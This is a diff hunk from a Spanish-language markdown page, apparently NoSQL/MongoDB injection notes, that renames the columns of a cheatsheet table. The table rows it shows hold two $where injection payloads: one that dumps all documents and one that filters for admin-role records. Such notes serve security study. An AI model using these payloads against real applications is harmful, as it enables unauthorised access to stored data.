@@ -22,7 +22,7 @@ linked:
 
 ## Cheatsheet
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|---|
 | **$where return true** | `{"$where":"return true"}` | Dump todos los docs. |
 | **$where custom filter** | `{"$where":"this.role=='admin'"}` | Filtrar por field arbitrario. |
